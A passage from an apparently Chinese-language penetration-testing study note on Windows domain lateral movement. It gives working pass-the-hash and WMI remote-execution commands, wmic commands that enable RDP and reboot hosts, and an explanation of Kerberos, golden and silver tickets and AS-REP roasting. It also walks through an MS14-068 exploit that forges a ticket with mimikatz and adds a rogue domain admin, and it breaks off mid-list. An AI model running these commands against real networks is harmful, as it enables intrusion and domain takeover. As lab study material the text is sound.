class=\"markdownIt-Anchor\" href=\"#wmiexecpy\">#</a> <a href=\"http://wmiexec.py\">wmiexec.py</a></h4>\n<ul>\n<li>Impacket 工具包下的<mark> wmiexec.py 脚本</mark>，可以用来直接获取 shell</li>\n<li>其他攻击手法可以看下 Readme，这里只对简单的 pth 做一下实验</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">python wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387 Administrator@192.168.254.144\npython wmiexec.py -hashes aad3b435b51404eeaad3b435b51404ee:42e2656ec24331269f82160ff5962387 Administrator@192.168.254.144 <span class=\"token string\">\"whoami\"</span>\n<span class=\"token comment\">#不加执行语句可直接获取cmd，加执行语句可返回执行结果</span>\n<span class=\"token comment\">#第一串字符可以随意写</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909201144353.png\" alt=\"image-20220909201144353\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909201307607.png\" alt=\"image-20220909201307607\"></p>\n<h4 id=\"wmiexecvbs\"><a class=\"markdownIt-Anchor\" href=\"#wmiexecvbs\">#</a> wmiexec.vbs</h4>\n<ul>\n<li>wmiexec.vbs 脚本通过 VBS 调用 WMI 来模拟 PsExec 的功能，wmiexec.vbs 下载地址：<a href=\"https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs\">https://github.com/k8gege/K8tools/blob/master/wmiexec.vbs</a></li>\n<li>获取 shell</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;shell 192.168.254.144 administrator QWEasd123<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909201610141.png\" alt=\"image-20220909201610141\"></p>\n<ul>\n<li>执行单条命令</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">cscript &#x2F;&#x2F;nologo wmiexec.vbs &#x2F;cmd 192.168.254.144 administrator QWEasd123 &quot;ipconfig&quot;<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909201745056.png\" alt=\"image-20220909201745056\"></p>\n<h4 id=\"invoke-wmicommand\"><a class=\"markdownIt-Anchor\" href=\"#invoke-wmicommand\">#</a> Invoke-WmiCommand</h4>\n<ul>\n<li>Invoke-WmiCommand.ps1 是 PowerSploit 工具包里的一部分，该脚本是利用 Powershell 调用 WMI 来远程执行命令。</li>\n<li>需要以管理员身份运行 powershell</li>\n</ul>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token comment\"># 导入 Invoke-WmiCommand.ps1 脚本</span>\n<span class=\"token function\">Import-Module</span> <span class=\"token punctuation\">.</span>\\<span class=\"token function\">Invoke-WmiCommand</span><span class=\"token punctuation\">.</span>ps1\n\n<span class=\"token comment\"># 指定目标系统用户名</span>\n<span class=\"token variable\">$User</span> = <span class=\"token string\">\".\\administrator\"</span>\n\n<span class=\"token comment\"># 指定目标系统的密码</span>\n<span class=\"token variable\">$Password</span> = <span class=\"token function\">ConvertTo-SecureString</span> <span class=\"token operator\">-</span>String <span class=\"token string\">\"QWEasd123\"</span> <span class=\"token operator\">-</span>AsPlainText <span class=\"token operator\">-</span>Force\n\n<span class=\"token comment\"># 将账号和密码整合起来，以便导入 Credential</span>\n<span class=\"token variable\">$Cred</span> = <span class=\"token function\">New-Object</span> <span class=\"token operator\">-</span>TypeName System<span class=\"token punctuation\">.</span>Management<span class=\"token punctuation\">.</span>Automation<span class=\"token punctuation\">.</span>PSCredential-ArgumentList <span class=\"token variable\">$User</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Password</span>\n\n<span class=\"token comment\"># 指定要执行的命令和目标 IP，ipconfig处替换为要执行的命令，ip替换为目标IP</span>\n<span class=\"token variable\">$Remote</span> = <span class=\"token function\">Invoke-WmiCommand</span> <span class=\"token operator\">-</span>Payload <span class=\"token punctuation\">&#123;</span>hostname<span class=\"token punctuation\">&#125;</span> <span class=\"token operator\">-</span>Credential <span class=\"token variable\">$Cred</span> <span class=\"token operator\">-</span>ComputerName 192<span class=\"token punctuation\">.</span>168<span class=\"token punctuation\">.</span>254<span class=\"token punctuation\">.</span>145\n\n<span class=\"token comment\"># 将执行结果输出到屏幕上</span>\n<span class=\"token variable\">$Remote</span><span class=\"token punctuation\">.</span>PayloadOutput<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909202245089.png\" alt=\"image-20220909202245089\"></p>\n<h4 id=\"invoke-wmimethod\"><a class=\"markdownIt-Anchor\" href=\"#invoke-wmimethod\">#</a> Invoke-WMIMethod</h4>\n<ul>\n<li>Invoke-WMIMethod 是 PowerShell 自带的一个模块，也可以用它来连接远程计算机执行命令和指定程序，<mark>无需下载脚本</mark></li>\n<li>看不到回显。。。</li>\n</ul>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token comment\"># 指定目标系统用户名</span>\n<span class=\"token variable\">$User</span>=<span class=\"token string\">\".\\administrator\"</span>\n\n<span class=\"token comment\"># 指定目标系统密码</span>\n<span class=\"token variable\">$Password</span>=<span class=\"token function\">ConvertTo-SecureString</span> <span class=\"token operator\">-</span>String <span class=\"token string\">\"QWEasd123\"</span> <span class=\"token operator\">-</span>AsPlainText <span class=\"token operator\">-</span>Force\n\n<span class=\"token comment\"># 将账号和密码整合起来，以便导入 Credential 中</span>\n<span class=\"token variable\">$Cred</span>=<span class=\"token function\">New-Object</span> <span class=\"token operator\">-</span>TypeName System<span class=\"token punctuation\">.</span>Management<span class=\"token punctuation\">.</span>Automation<span class=\"token punctuation\">.</span>PSCredential <span class=\"token operator\">-</span>ArgumentList <span class=\"token variable\">$User</span><span class=\"token punctuation\">,</span><span class=\"token variable\">$Password</span>\n\n<span class=\"token comment\"># 在远程系统中运行hostname命令</span>\n<span class=\"token function\">Invoke-WMIMethod</span> <span class=\"token operator\">-</span><span class=\"token keyword\">Class</span> Win32_Process <span class=\"token operator\">-</span>Name Create <span class=\"token operator\">-</span>ArgumentList <span class=\"token string\">\"calc.exe\"</span> <span class=\"token operator\">-</span>ComputerName <span class=\"token string\">\"192.168.254.145\"</span> <span class=\"token operator\">-</span>Credential <span class=\"token variable\">$Cred</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909202600198.png\" alt=\"image-20220909202600198\"></p>\n<h4 id=\"wmic的其他命令\"><a class=\"markdownIt-Anchor\" href=\"#wmic的其他命令\">#</a> wmic 的其他命令</h4>\n<ul>\n<li>使用 wmic 远程开启目标的 RDP</li>\n</ul>\n<pre class=\"line-numbers language-powershell\" data-language=\"powershell\"><code class=\"language-powershell\"><span class=\"token comment\"># 适于 Windows xp、server 2003</span>\nwmic <span class=\"token operator\">/</span>node:192<span class=\"token punctuation\">.</span>168<span class=\"token punctuation\">.</span>7<span class=\"token punctuation\">.</span>7 <span class=\"token operator\">/</span>user:administrator <span class=\"token operator\">/</span>password:123456 PATH win32_terminalservicesetting WHERE <span class=\"token punctuation\">(</span>__Class!=<span class=\"token string\">\"\"</span><span class=\"token punctuation\">)</span> CALL SetAllowTSConnections 1\n\n<span class=\"token comment\"># 适于 Windows 7、8、10，server 2008、2012、2016，注意 ServerName 需要改为目标的 hostname</span>\nwmic <span class=\"token operator\">/</span>node:192<span class=\"token punctuation\">.</span>168<span class=\"token punctuation\">.</span>254<span class=\"token punctuation\">.</span>144 <span class=\"token operator\">/</span>user:administrator <span class=\"token operator\">/</span>password:QWEasd123 RDTOGGLEWHERE ServerName=<span class=\"token string\">'12server1'</span> call SetAllowTSConnections 1\n<span class=\"token comment\">#或者</span>\nwmic <span class=\"token operator\">/</span>node:192<span class=\"token punctuation\">.</span>168<span class=\"token punctuation\">.</span>254<span class=\"token punctuation\">.</span>144 <span class=\"token operator\">/</span>user:administrator <span class=\"token operator\">/</span>password:QWEasd123 <span class=\"token keyword\">process</span> call create <span class=\"token string\">'cmd.exe /c REG ADD \"HKLM\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\" /v fDenyTSConnections /t REG_DWORD /d 0 /f'</span>\n\n<span class=\"token comment\">#判断是否开启RDP,0x0开启，0x1关闭</span>\nREG QUERY <span class=\"token string\">\"HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Control\\Terminal Server\"</span> <span class=\"token operator\">/</span>v fDenyTSConnections\n\n<span class=\"token comment\">#远程重启电脑</span>\nwmic <span class=\"token operator\">/</span>node:192<span class=\"token punctuation\">.</span>168<span class=\"token punctuation\">.</span>254<span class=\"token punctuation\">.</span>144 <span class=\"token operator\">/</span>user:administrator <span class=\"token operator\">/</span>password:QWEasd123 <span class=\"token keyword\">process</span> call create <span class=\"token string\">\"shutdown.exe -r -f -t 0\"</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909210747663.png\" alt=\"image-20220909210747663\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220909210851629.png\" alt=\"image-20220909210851629\"></p>\n<h2 id=\"2-pttpass-the-ticket票据传递攻击\"><a class=\"markdownIt-Anchor\" href=\"#2-pttpass-the-ticket票据传递攻击\">#</a> 2、PTT (Pass The Ticket) 票据传递攻击</h2>\n<h3 id=\"21-kerberos协议\"><a class=\"markdownIt-Anchor\" href=\"#21-kerberos协议\">#</a> 2.1 Kerberos 协议</h3>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911155128604.png\" alt=\"image-20220911155128604\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911155144972.png\" alt=\"image-20220911155144972\"></p>\n<ul>\n<li>\n<p>Kerberos 协议是一种计算机网络授权协议，用来在非安全网络中，对个人通信以安全的手段进行身份认证。其设计目标是通过密钥系统为客户机与服务器应用程序提供强大的认证服务。该协议的认证过程的实现不依赖于主机操作系统的认证，无需基于主机地址的信任，不要求网络上所有主机的物理安全，并假定网络上传送的数据包可以被任意地读取、修改和插入数据。在以上情况下， Kerberos 作为一种可信任的第三方认证服务，是通过传统的密码技术（如：共享密钥) 执行认证服务的。Kerberos 协议在在内网域渗透领域中至关重要，白银票据、黄金票据、攻击域控等都离不开 Kerberos 协议。</p>\n</li>\n<li>\n<p>为了让阁下能够更轻松地理解后文对认证原理的讲解，你需要先了解以下几个关键角色：</p>\n</li>\n</ul>\n<table>\n<thead>\n<tr>\n<th>角色</th>\n<th>作用</th>\n</tr>\n</thead>\n<tbody>\n<tr>\n<td>Domain Controller</td>\n<td>域控制器，简称 DC，一台计算机，实现用户、计算机的统一管理</td>\n</tr>\n<tr>\n<td>Key Distribution Center</td>\n<td>秘钥分发中心，简称 KDC，默认安装在域控里，包括 AS 和 TGS</td>\n</tr>\n<tr>\n<td>Authentication Service</td>\n<td>身份验证服务，简称 AS，用于 KDC 对 Client 认证</td>\n</tr>\n<tr>\n<td>Ticket Granting Service</td>\n<td>票据授予服务，简称 TGS，用于 KDC 向 Client 和 Server 分发 Session Key（临时秘钥）</td>\n</tr>\n<tr>\n<td>Active Director</td>\n<td>活动目录，简称 AD，用于存储用 户、用户组、域相关的信息</td>\n</tr>\n<tr>\n<td>Client</td>\n<td>客户端：指用户</td>\n</tr>\n<tr>\n<td>Server</td>\n<td>服务端：可能是某台计算机，也可能是某个服务</td>\n</tr>\n</tbody>\n</table>\n<ul>\n<li>打个比方：当 whoami 要和 bunny 进行通信的时候，whoami 就需要向 bunny 证明自己是 whoami，直接的方式就是 whoami 用二人之间的秘密做秘钥加密明文文字生成密文，把密文和明文文字一块发送给 bunny，bunny 再用秘密解密得到明文，把明文和明文文字进行对比，若一致，则证明对方是 whoami</li>\n<li>但是网络中，密文和文字很有可能被窃取，并且只要时间足够，总能破解得到秘钥。所以不能使用这种长期有效的秘钥，要改为短期的临时秘钥。那么这个临时秘钥就需要一个第三方可信任的机构来提供，即 KDC（Key Distribution Center）秘钥分发中心</li>\n</ul>\n<h3 id=\"22-kerberos认证原理\"><a class=\"markdownIt-Anchor\" href=\"#22-kerberos认证原理\">#</a> 2.2 Kerberos 认证原理</h3>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911155923465.png\" alt=\"image-20220911155923465\"></p>\n<p>整个认证过程如下：</p>\n<ol>\n<li>首先 Client 向域控制器 DC 请求访问 Server，DC 通过去 AD 活动目录中查找依次区分 Client 来判断 Client 是否可信</li>\n<li>认证通过后返回 TGT 给 Client，Client 得到 TGT（Ticket Granting Ticket）</li>\n<li>Client 继续拿着 TGT 请求 DC 访问 Server，TGS 通过 Client 消息中的 TGT， 判断 Client 是否有访问权限</li>\n<li>如果有，则给 Client 有访问 Server 的权限 Ticket，也叫 ST（Service Ticket）</li>\n<li>Client 得到 Ticket 后，再去访问 Server，且该 Ticket 只针对这一个 Server 有效</li>\n<li>最终 Server 和 Client 建立通信</li>\n</ol>\n<p>详细认证步骤分为以下三个阶段</p>\n<ul>\n<li>AS_REQ &amp; AS_REP</li>\n<li>TGS_REQ &amp; TGS_REP</li>\n<li>AP_REQ &amp; AP_REP</li>\n</ul>\n<h4 id=\"as_req-as_rep\"><a class=\"markdownIt-Anchor\" href=\"#as_req-as_rep\">#</a> AS_REQ &amp; AS_REP</h4>\n<p>该阶段是 Client 和 AS 的认证，通过认证的客户端将获得 TGT 认购权证</p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911160829033.png\" alt=\"image-20220911160829033\"></p>\n<ul>\n<li>当域内某个客户端用户 Client 试图访问域内的某个服务，于是输入用户名和密码，此时客户端本机的 Kerberos 服务会向 KDC 的 AS 认证服务发送一个 AS_REQ 认证请求。请求的凭据是 Client 的哈希值 NTLM-Hash 加密的时间戳以及 Clientinfo、Server-info 等数据，以及一些其他信息</li>\n<li>当 Client 发送身份信息给 AS 后，AS 会先向<mark>活动目录 AD</mark> 请求，询问是否有此 Client 用户，如果有的话，就会取出它的 NTLM-Hash，并对 AS_REQ 请求中加密的时间戳进行解密，如果解密成功，则证明客户端提供的密码正确，如果时间戳在五分钟之内，则预认证成功。然后 AS 会生成一个临时秘钥 Session-Key AS，并使用客户端 Client 的 NTLM-Hash 加密 Session-key AS 作为响应包的一部分内容。此 Session-key AS 用于确保客户端和 KGS 之间的通信安全</li>\n<li>还有一部分响应内容内容是 TGT：使用 KDC 一个特定账户的 NTLM-Hash 对 Session-key AS、时间戳、Client-info 进行的加密。这个特定账户就是创建域控时自动生成的 Krbtgt 用户，然后将这两部分以及<mark> PAC</mark> 等信息回复给 Client，即 AS_REP。PAC 中包含的是用户的 SID、用户所在的组等一些信息</li>\n<li>AS-REP 中最核心的东西就是 Session-key 和 TGT。我们平时用 Mimikatz、kekeo、rubeus 等工具生成的凭据是 .kirbi 后缀，Impacket 生成的凭据的后缀是 .ccache。这两种票据主要包含的都是 Session-key 和 TGT，因此可以相互转化</li>\n<li>至此，Kerberos 认证的第一步完成</li>\n</ul>\n<h4 id=\"tgs_req-tgs_rep\"><a class=\"markdownIt-Anchor\" href=\"#tgs_req-tgs_rep\">#</a> TGS_REQ &amp; TGS_REP</h4>\n<p>该阶段是 Client 和 TGS 的认证，通过认证的客户端将获得 ST 服务票据</p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911161308310.png\" alt=\"image-20220911161308310\"></p>\n<ul>\n<li>客户端 Client 收到 AS 的回复 AS_REP 后分别获得了 TGT 和加密的 Session-Key AS。它会先用自己的 Client NTLM-hash 解密得到原始的 Session-Key AS，然后会在本地缓存此 TGT 和原始的 Session-Key AS，如果现在它就需要访问某台服务器上的服务，他就需要凭借这张 TGT 认购凭证向 KGS 购买相应的 ST 服务票据（也叫 Ticket）</li>\n<li>此时 Client 会使用 Session-Key AS 加密时间戳、Client-info、Server-info 等数据作为一部分。由于 TGT 是用 Krbtgt 账户的 NTLM-Hash 加密的，Client 无法解密，所以 Client 会将 TGT 作为另一部分继续发送给 TGS。两部分组成的请求被称为 TGS_REQ。</li>\n<li>TGS 收到该请求，用 Krbtgt 用户的 NTLM-hash 先解密 TGT 得到 Session-key AS、 时间戳、Client-info 以及 Server-info。再用 Session-key AS 解密第一部分内容，得到 Client-info、时间戳。然后将两部分获取到时间戳进行比较，如果时间戳跟当前时间相差太久，就需要重新认证。TGS 还会将这个 Client 的信息与 TGT 中的 Client 信息进行比较，如果两个相等的话，还会继续判断 Client 有没有权限访问 Server， 如果都没有问题，认证成功。认证成功后，KGS 会生成一个 Session-key TGS，并用 Session-key AS 加密 Session-key TGS 作为响应的一部分。此 Session-key TGS 用于确保客户端和服务器之间的通信安全</li>\n<li>另一部分是使用服务器 Server 的 NTLM-Hash 加密 Session-key TGS、时间戳以及 Client-info 等数据生成的 ST。然后 TGS 将这两部分信息回复给 Client，即 TGS_REP</li>\n<li>至此，Client 和 KDC 的通信就结束了，然后是和 Server 进行通信</li>\n</ul>\n<h4 id=\"ap_req-ap_rep\"><a class=\"markdownIt-Anchor\" href=\"#ap_req-ap_rep\">#</a> AP_REQ &amp; AP_REP</h4>\n<p>该阶段是 Client 和 TGS 的认证，通过认证的客户端将与服务器建立连接。</p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911161619504.png\" alt=\"image-20220911161619504\"></p>\n<ul>\n<li>客户端 Client 收到 TGS_REP 后，分别获得了 ST 和加密的 Session-Key TGS。它会 先使用本地缓存了的 Session-key AS 解密出了原始的 Session-key TGS。然后它会在本地缓存此 ST 和原始的 Session-Key TGS，当客户端需要访问某台服务器上的服务时会向服务器发送请求。它会使用 Session-key TGS 加密 Client-info、时间戳等信息作为一部分内容。ST 因为使用的是 Server NTLM-hash 进行的加密，无法解密，所以会原封不动发送给 Server。两部分一块发送给 Server，这个请求即是 AP_REQ。</li>\n<li>Server 收到 AP_REQ 请求后，用自身的 Server NTLM-Hash 解密了 ST，得到 Session-Key TGS，再解密出 Client-info、时间戳等数据。然后与 ST 的 Clientinfo、时间戳等进行一一对比。时间戳有效时间一般时间为 8 小时。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限，DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信 息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。通过认证后 Server 将返回最终的 AP-REP 并与 Client 建立通信</li>\n<li>至此，Kerberos 认证流程基本结束</li>\n</ul>\n<h3 id=\"23-pac\"><a class=\"markdownIt-Anchor\" href=\"#23-pac\">#</a> 2.3 PAC</h3>\n<ul>\n<li>我们在前面关于 Kerberos 认证流程的介绍中提到了 PAC（Privilege Attribute Certificate）这个东西，这是微软为了访问控制而引进的一个扩展，即特权访问证书</li>\n<li>在上面的认证流程中，如果没有 PAC 的访问控制作用的话，只要用户的身份验证 正确，那么就可以拿到 TGT，有了 TGT，就可以拿到 ST，有了 ST ，就可以访问服务了。此时任何一个经过身份验证的用户都可以访问任何服务。像这样的认证只解 决了 “Who am i?” 的问题，而没有解决 “What can I do?” 的问题</li>\n<li>为了解决上面的这个问题，微软引进了 PAC。即 KDC 向客户端 Client 返回 AS_REP 时插入了 PAC，PAC 中包含的是用户的 SID、用户所在的组等一些信息。当最后服务端 Server 收到 Client 发来的 AP_REQ 请求后，首先会对客户端身份验证。通过客户端身份验证后，服务器 Server 会拿着 PAC 去询问 DC 该用户是否有访问权限， DC 拿到 PAC 后进行解密，然后通过 PAC 中的 SID 判断用户的用户组信息、用户权限等信息，然后将结果返回给服务端，服务端再将此信息域用户请求的服务资源的 ACL 进行对比，最后决定是否给用户提供相关的服务。</li>\n<li>但是在有些服务中并没有验证 PAC 这一步，这也是<mark>白银票据能成功的前提</mark>，因为就算拥有用户的 Hash，可以伪造 TGS，但是也不能制作 PAC， PAC 当然也验证不成功，但是有些服务不去验证 PAC，这是白银票据成功的前提</li>\n</ul>\n<h3 id=\"24-kerberos认证中的相关安全问题概述\"><a class=\"markdownIt-Anchor\" href=\"#24-kerberos认证中的相关安全问题概述\">#</a> 2.4 Kerberos 认证中的相关安全问题概述</h3>\n<p>Kerberos 认证并不是天衣无缝的，这其中也会有各种漏洞能够被我们利用，比如我们常说的 MS14-068、黄金票据、白银票据等就是基于 Kerberos 协议进行攻击 的。下面我们便来大致介绍一下 Kerberos 认证中的相关安全问题</p>\n<h4 id=\"黄金票据golden-ticket\"><a class=\"markdownIt-Anchor\" href=\"#黄金票据golden-ticket\">#</a> 黄金票据（Golden ticket）</h4>\n<ul>\n<li>\n<p>在 Windows 的 kerberos 认证过程中，Client 将自己的信息发送给 KDC，然后 KDC 使用 Krbtgt 用户的 NTLM-Hash 作为密钥进行加密，生成 TGT。那么如果获取到了 Krbtgt 的 NTLM-Hash 值，不就可以伪造任意的 TGT 了吗。因为 Krbtgt 只有域控制器上面才有，所以使用黄金凭据意味着你之前拿到过域控制器的权限，黄金凭据可以理解为一个<mark>后门</mark></p>\n</li>\n<li>\n<p>先假设这么一种情况，原先已拿到的域内所有的账户 Hash，包括 Krbtgt 这个账 户，由于有些原因导致你对域管权限丢失，但好在你还有一个普通域用户权限，碰巧管理员在域内加固时忘记重置 Krbtgt 密码，基于此条件，我们还能利用该票据重新获得域管理员权限。利用 Krbtgt 的 Hash 值可以伪造生成任意的 TGT，能够绕过对任意用户的账号策略，让用户成为任意组的成员，可用于 Kerberos 认证的任何服务</p>\n</li>\n</ul>\n<h4 id=\"白银票据silver-ticket\"><a class=\"markdownIt-Anchor\" href=\"#白银票据silver-ticket\">#</a> 白银票据（Silver ticket）</h4>\n<ul>\n<li>白银票据不同于黄金票据，白银票据的利用过程是伪造 TGS，通过已知的授权服务密码生成一张可以访问该服务的 TGT。因为在票据生成过程中不需要使用 KDC，所以可以绕过域控制器，很少留下日志。而黄金票据在利用过程中由 KDC 颁发 TGT，并且在生成伪造 TGT 的 20 分钟内，TGS 不会对该 TGT 的真伪进行效验。 白银票据依赖于服务账号的密码散列值，这不同于黄金票据利用需要使用 Krbtgt 账号的密码哈希值，因此更加隐蔽</li>\n</ul>\n<h4 id=\"ms14-068\"><a class=\"markdownIt-Anchor\" href=\"#ms14-068\">#</a> MS14-068</h4>\n<ul>\n<li>这里便用到了我们之前所讲到的 PAC 这个东西，PAC 是用来验证 Client 的访问权限的，它会被放在 TGT 里发送给 Client，然后由 Client 发送给 TGS。但也恰恰是这个 PAC 造成了 MS14-068 这个漏洞</li>\n<li>该漏洞是位于 kdcsvc.dll 域控制器的密钥分发中心（KDC）服务中的 Windows 漏洞，它允许经过身份验证的用户在其获得的票证 TGT 中插入任意的 PAC 。普通用户可以通过呈现具有改变了 PAC 的 TGT 来伪造票据获得管理员权限</li>\n</ul>\n<h4 id=\"密码喷洒攻击password-spraying\"><a class=\"markdownIt-Anchor\" href=\"#密码喷洒攻击password-spraying\">#</a> 密码喷洒攻击（Password Spraying）</h4>\n<ul>\n<li>在实际渗透中，许多渗透测试人员和攻击者通常都会使用一种被称为 “密码喷洒” （Password Spraying）的技术来进行测试和攻击。对密码进行喷洒式的攻击，这个叫法很形象，因为它属于自动化密码猜测的一种。这种针对所有用户的自动密码猜测通常是为了避免帐户被锁定，因为针对同一个用户的连续密码猜测会导致帐户被锁定。所以只有对所有用户同时执行特定的密码登录尝试，才能增加破解的概率，消除帐户被锁定的概率。普通的爆破就是用户名固定，爆破密码，但是密码喷洒，是用固定的密码去跑用户名</li>\n</ul>\n<h4 id=\"as-rep-roasting\"><a class=\"markdownIt-Anchor\" href=\"#as-rep-roasting\">#</a> AS-REP Roasting</h4>\n<ul>\n<li>我们前文说过，AS_REQ &amp; AS_REP 认证的过程是 Kerberos 身份认证的第一步，该过程又被称为预身份验证。预身份验证主要是为了防止密码脱机爆破</li>\n<li>而如果域用户设置了选项 “Do not require Kerberos preauthentication”（该选项默认没有开启）关闭了预身份验证的话，攻击者可以使用指定的用户去请求票据，向域控制器发送 AS_REQ 请求，此时域控会不作任何验证便将 TGT 票据和加密的 Session-key 等信息返回。因此攻击者就可以对获取到的加密 Session-key 进行离线破解，如果爆破成功，就能得到该指定用户的明文密码，这种攻击方式被称作 AS-REP</li>\n</ul>\n<h3 id=\"25-票据传递攻击\"><a class=\"markdownIt-Anchor\" href=\"#25-票据传递攻击\">#</a> 2.5 票据传递攻击</h3>\n<h4 id=\"ms14-068-2\"><a class=\"markdownIt-Anchor\" href=\"#ms14-068-2\">#</a> MS14-068</h4>\n<ul>\n<li>受影响版本：Windows Server 2003、Windows Server 2008、Windows Server 2008 R2、Windows Server 2012 和 Windows Server 2012 R2</li>\n<li>该漏洞可导致活动目录整体权限控制收到影响，允许攻击者将域内任意用户权限提升至域管理级别。</li>\n<li>信息收集：</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">systeminfo <span class=\"token operator\">|</span> <span class=\"token function\">find</span> <span class=\"token string\">\"3011780\"</span> <span class=\"token comment\">#如果返回为空则未打补丁</span>\nsysteminfo <span class=\"token comment\">#查看域名称</span>\nnltest/dsgetdc:域名 <span class=\"token comment\">#查看域控的主机名</span>\nnet config workstation <span class=\"token comment\">#收集域名和其他信息</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911191248276.png\" alt=\"image-20220911191248276\"></p>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">dir</span> <span class=\"token punctuation\">\\</span><span class=\"token punctuation\">\\</span>WIN-9ESHUR52A3G.moonsec.fbi<span class=\"token punctuation\">\\</span>c$ <span class=\"token comment\">#正常情况下无法访问</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span></span></code></pre>\n<ul>\n<li>使用 MS14-068 伪造票据</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\"><span class=\"token function\">whoami</span> /all <span class=\"token comment\">#查看当前用户的SID S-1-5-21-3501430782-1563410060-2157377696-1108</span>\nms14-068.exe -u 域成员名@域名 -p 域成员密码 -s 域成员 sid -d 域控制器地址\nms14-068.exe -u 12server1@moonsec.fbi -p <span class=\"token number\">123456</span> -s S-1-5-21-3501430782-1563410060-2157377696-1108 -d WIN-9ESHUR52A3G.moonsec.fbi<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span><span></span></span></code></pre>\n<ul>\n<li>执行后会在当前目录下生成一个 TGT 文件</li>\n</ul>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911191916143.png\" alt=\"image-20220911191916143\"></p>\n<ul>\n<li>使用 mimikatz 清空当前内存中的票据，并把这个 TGT 文件导入</li>\n</ul>\n<pre class=\"line-numbers language-bash\" data-language=\"bash\"><code class=\"language-bash\">kerberos::purge <span class=\"token comment\">#清除当前内存的票据</span>\nkerberos::ptc <span class=\"token string\">\"票据文件\"</span> <span class=\"token comment\">#导入票据文件</span><span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911193244569.png\" alt=\"image-20220911193244569\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911192230621.png\" alt=\"image-20220911192230621\"></p>\n<ul>\n<li>此时我们可以向域中添加域管理员账号密码</li>\n</ul>\n<pre class=\"line-numbers language-cmd\" data-language=\"cmd\"><code class=\"language-cmd\">net user moonsec123 Qwe123... &#x2F;add &#x2F;domain\nnet group &quot;Domain Admins&quot; moonsec123 &#x2F;add &#x2F;domain<span aria-hidden=\"true\" class=\"line-numbers-rows\"><span></span><span></span></span></code></pre>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911192446697.png\" alt=\"image-20220911192446697\"></p>\n<p><img src=\"https://wuriteup.oss-cn-qingdao.aliyuncs.com/writeupImgs/image-20220911192547048.png\" alt=\"image-20220911192547048\"></p>\n<h4 id=\"黄金票据\"><a class=\"markdownIt-Anchor\" href=\"#黄金票据\">#</a> 黄金票据</h4>\n<ul>\n<li>黄金票据使用的前提是我们已经通过 MS14-068 或者其他方法获取域控权限</li>\n<li>伪造黄金票据的所需条件\n<ol>\n<li>域名称</li>\n<li>域的 SID 